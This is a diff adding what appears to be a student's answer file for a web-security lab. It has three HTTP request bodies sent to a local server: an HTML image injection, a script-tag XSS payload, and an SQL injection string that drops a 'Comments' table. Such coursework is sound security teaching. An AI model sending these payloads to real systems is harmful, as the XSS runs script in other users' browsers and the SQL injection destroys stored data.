@@ -1,0 +1,28 @@
+yha126
+6770081
+Yoojin HA
+
+Q1
+
+Host:localhost:8188
+Content-Type:application/json;charset=UTF-8
+Content-Length:61
+
+"<img src=\"http://redsox.tcs.auckland.ac.nz/ups/logo.svg\">"
+
+Q2
+
+Host:localhost:8188
+Content-Type:application/json;charset=UTF-8
+Content-Length:37
+
+"<script>alert(\"Gotcha!\")</script>"
+
+
+Q3
+
+Host:localhost:8188
+Content-Type:application/json;charset=UTF-8
+Content-Length:27
+
+"');Drop table Comments;--"
